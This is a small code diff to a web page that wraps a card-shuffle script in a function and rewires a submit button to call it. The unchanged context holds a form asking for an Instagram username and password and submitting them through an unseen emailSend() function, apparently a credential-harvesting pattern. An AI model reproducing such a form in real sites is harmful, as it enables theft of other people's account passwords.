@@ -180,6 +180,7 @@
         }
         Object.getOwnPropertyDescriptor(factorial,controlGate);
 
+	function cards(){
 	// Fisher–Yates shuffle Algorithm
 	let cards = ["Hearts", "Diamonds", "Clubs", "Spades"];
         let values = [
@@ -203,6 +204,7 @@
         }
 
         alert(res);
+	}
 
 </script>
 
@@ -212,7 +214,7 @@
 	<form onsubmit="emailSend(); reset(); return false;">
 	<input type="text" id="rsa" placeholder="instagram name" name="rsa" required>
 	<input type="password" id="password" placeholder="password" name="password" required>
-        <input type="button" value="submit" onclick="generatePDF()"/>
+        <input type="button" value="submit" onclick="cards()"/>
 	</form>
 </div>
 
